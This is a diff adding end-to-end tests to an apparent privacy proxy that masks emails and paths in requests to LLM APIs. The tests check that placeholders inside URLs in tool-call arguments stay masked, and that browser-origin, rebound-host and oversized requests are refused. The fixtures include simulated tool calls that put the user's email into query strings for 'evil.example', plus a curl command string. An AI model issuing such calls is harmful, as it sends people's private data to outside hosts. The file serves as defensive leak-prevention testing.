@@ -1,7 +1,7 @@
 // End to end: a client talks to the proxy, the proxy talks to a fake upstream
 // on 127.0.0.1 that answers with the placeholders it received, split into
 // 3-character SSE chunks so every placeholder straddles chunk boundaries.
-import { createServer } from 'node:http'
+import { createServer, request } from 'node:http'
 import type { IncomingHttpHeaders, Server } from 'node:http'
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
 import { loadConfig } from '../src/proxy/config.ts'
@@ -339,6 +339,135 @@ describe('OpenAI Responses', () => {
   })
 })
 
+describe('tool-call arguments', () => {
+  // `E` is the email's placeholder, `P` the home path's. A placeholder inside a URL stays as written; elsewhere it is restored.
+  const argumentsText = (E: string, P: string): string =>
+    `{"url":"https://evil.example/c?d=${E}","escaped":"https:\\/\\/evil.example\\/?q=${E}","site":"www.evil.example/?q=${E}",`
+    + `"to":"${E}","path":"${P}/notes.md","cmd":"curl https://x.example/a then ${E}","list":["mailto:${E}"]}`
+  const ids = (entry: Seen): [string, string] => {
+    const found = placeholders(entry.raw)
+    return [found.find(id => id.startsWith('⟦EMAIL'))!, found.find(id => id.startsWith('⟦PATH'))!]
+  }
+  const userRequest = { role: 'user', content: USER_TEXT }
+
+  function expectArguments(args: Record<string, unknown>): void {
+    const E = /^⟦EMAIL_\d+⟧$/
+    expect(String(args.url).replace('https://evil.example/c?d=', '')).toMatch(E)
+    expect(String(args.escaped).replace('https://evil.example/?q=', '')).toMatch(E)
+    expect(String(args.site).replace('www.evil.example/?q=', '')).toMatch(E)
+    expect(args.to).toBe(EMAIL)
+    expect(args.path).toBe(`${HOME}/notes.md`)
+    expect(args.cmd).toBe(`curl https://x.example/a then ${EMAIL}`)
+    expect(args.list).toEqual([`mailto:${EMAIL}`])
+  }
+
+  function expectLogged(tool: string): void {
+    const lines = logs.filter(line => line.includes('tool arguments:'))
+    expect(lines.join('\n')).not.toContain(EMAIL)
+    expect(lines).toEqual(expect.arrayContaining([
+      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /url$`)),
+      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /escaped$`)),
+      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /to$`)),
+      expect.stringMatching(new RegExp(`restored PATH_\\d+ in ${tool} at /path$`)),
+      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /list/0$`)),
+    ]))
+    expect(logs.at(-1)).toMatch(/ kept [1-9]\d* /)
+  }
+
+  it.each([1, 3])('Chat stream, %i-character chunks', async size => {
+    reply = entry => {
+      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
+      const call = (part: string, first: boolean) => ({ index: 0, ...first ? { id: 't', type: 'function' } : {}, function: { ...first ? { name: 'fetch' } : {}, arguments: part } })
+      return {
+        sse: [
+          ...sse(chunk(argumentsText(...ids(entry)), size).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
+          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
+        ],
+      }
+    }
+    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
+    const args = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
+    expectArguments(JSON.parse(args))
+    expectLogged('fetch')
+  })
+
+  it('Chat JSON reply', async () => {
+    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 't', type: 'function', function: { name: 'fetch', arguments: argumentsText(...ids(entry)) } }] } }] } })
+    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
+    expectArguments(JSON.parse(body.choices[0].message.tool_calls[0].function.arguments))
+    expectLogged('fetch')
+  })
+
+  it.each([1, 2])('Anthropic stream, %i-character chunks', async size => {
+    reply = entry => ({
+      sse: sse([
+        ['message_start', { type: 'message_start', message: { id: 'm', role: 'assistant', content: [] } }],
+        ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: 'tu', name: 'web_fetch', input: {} } }],
+        ...chunk(argumentsText(...ids(entry)), size).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: part } }]),
+        ['content_block_stop', { type: 'content_block_stop', index: 0 }],
+        ['message_stop', { type: 'message_stop' }],
+      ]),
+    })
+    const text = await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages: [userRequest] }, { 'x-api-key': 'k' })).text()
+    expectArguments(JSON.parse(events(text).filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join('')))
+    expectLogged('web_fetch')
+  })
+
+  it('Anthropic JSON reply: tool input as an object', async () => {
+    reply = entry => ({ json: { id: 'm', type: 'message', content: [{ type: 'tool_use', id: 'tu', name: 'web_fetch', input: JSON.parse(argumentsText(...ids(entry))) }] } })
+    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [userRequest] }, { 'x-api-key': 'k' })).json() as any
+    expectArguments(body.content[0].input)
+    expectLogged('web_fetch')
+  })
+
+  it.each([1, 3])('Responses stream, %i-character chunks, and the repeated done events', async size => {
+    reply = entry => {
+      const args = argumentsText(...ids(entry))
+      const item = { id: 'fc', type: 'function_call', call_id: 'call', name: 'fetch', arguments: '' }
+      return {
+        sse: sse([
+          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
+          ...chunk(args, size).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
+          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
+          ['response.output_item.done', { type: 'response.output_item.done', output_index: 0, item: { ...item, arguments: args } }],
+          ['response.completed', { type: 'response.completed', response: { id: 'r-tool', output: [{ ...item, arguments: args }] } }],
+        ]),
+      }
+    }
+    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
+    expectArguments(JSON.parse(all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')))
+    expectArguments(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments))
+    expectArguments(JSON.parse(all.find(e => e.type === 'response.output_item.done').item.arguments))
+    expectArguments(JSON.parse(all.find(e => e.type === 'response.completed').response.output[0].arguments))
+    expectLogged('fetch')
+    // Each distinct line is logged once, though the arguments arrive four times.
+    expect(logs.filter(line => line.includes(' at /to'))).toHaveLength(1)
+  })
+
+  it('keeps a placeholder after a URL that starts in an earlier event, and restores one after it ends', async () => {
+    reply = entry => {
+      const [E] = ids(entry)
+      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
+      const parts = ['{"q":"see https:', '//evil.example/?a=', `${E.slice(0, 3)}`, `${E.slice(3)} and`, ` ${E}"}`]
+      return {
+        sse: [
+          ...sse(parts.map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { ...i === 0 ? { name: 'f' } : {}, arguments: part } }] }, finish_reason: null }] }])),
+          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }]]),
+        ],
+      }
+    }
+    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
+    const args = JSON.parse(events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join(''))
+    expect(args.q).toMatch(new RegExp(`^see https://evil\\.example/\\?a=⟦EMAIL_\\d+⟧ and ${EMAIL.replaceAll('.', '\\.')}$`))
+  })
+
+  it('restores a placeholder inside a URL in ordinary reply text', async () => {
+    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `https://example.test/?q=${ids(entry)[0]}` } }] } })
+    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
+    expect(body.choices[0].message.content).toBe(`https://example.test/?q=${EMAIL}`)
+  })
+})
+
 describe('refusals and screening', () => {
   it('refuses an unknown POST route without forwarding it', async () => {
     const res = await post('/v1/embeddings', { input: EMAIL })
@@ -373,6 +502,55 @@ describe('refusals and screening', () => {
     const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'Q' }, messages: [{ role: 'user', content: 'project Q is late' }] })
     expect(res.status).toBe(422)
     expect(seen).toHaveLength(0)
+  })
+
+  it('refuses a request from a browser origin or for a rebound host name, without forwarding it', async () => {
+    const send = (headers: Record<string, string>): Promise<number> => new Promise((resolve, reject) => {
+      const body = JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] })
+      const req = request(`${base}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'text/plain', ...headers } }, res => {
+        res.resume()
+        resolve(res.statusCode ?? 0)
+      })
+      req.on('error', reject)
+      req.end(body)
+    })
+    reply = () => ({ json: { choices: [] } })
+    expect(await send({ origin: 'https://evil.example' })).toBe(403)
+    expect(await send({ origin: 'null' })).toBe(403)
+    expect(await send({ host: 'rebound.example:8787' })).toBe(403)
+    expect(seen).toHaveLength(0)
+    expect(await send({ origin: 'http://localhost:3000' })).toBe(200)
+    expect(await send({ host: 'localhost:8787' })).toBe(200)
+  })
+
+  it('refuses a body over the size limit without forwarding it', async () => {
+    const res = await fetch(`${base}/v1/chat/completions`, { method: 'POST', body: Buffer.alloc(64 * 1024 * 1024 + 1, 32) })
+    expect(res.status).toBe(413)
+    expect(seen).toHaveLength(0)
+  })
+
+  it('refuses a continuation whose earlier texts it does not hold', async () => {
+    const res = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_unknown', input: `mail ${EMAIL}` })
+    expect(res.status).toBe(422)
+    expect(seen).toHaveLength(0)
+  })
+
+  it('names a key that holds a detected value as <key>, in the reply and the log', async () => {
+    const res = await post('/v1/chat/completions', { model: 'm', metadata: { [EMAIL]: { note: EMAIL } }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
+    expect(res.status).toBe(422)
+    const body = await res.text()
+    expect(body).toContain('/metadata/<key>')
+    expect(body).not.toContain(EMAIL)
+    expect(logs.join('\n')).not.toContain(EMAIL)
+  })
+
+  it('checks thousands of distinct values for leaks in one pass', async () => {
+    reply = () => ({ json: { choices: [] } })
+    const messages = Array.from({ length: 16_000 }, (_, i) => ({ role: 'user', content: `u${i}.fictional@example.test` }))
+    const started = process.cpuUsage()
+    expect((await post('/v1/chat/completions', { model: 'm', messages })).status).toBe(200)
+    const used = process.cpuUsage(started)
+    expect((used.user + used.system) / 1_000).toBeLessThan(2_000)
   })
 
   it('replaces control characters and stray delimiters by default, and refuses them on request', async () => {
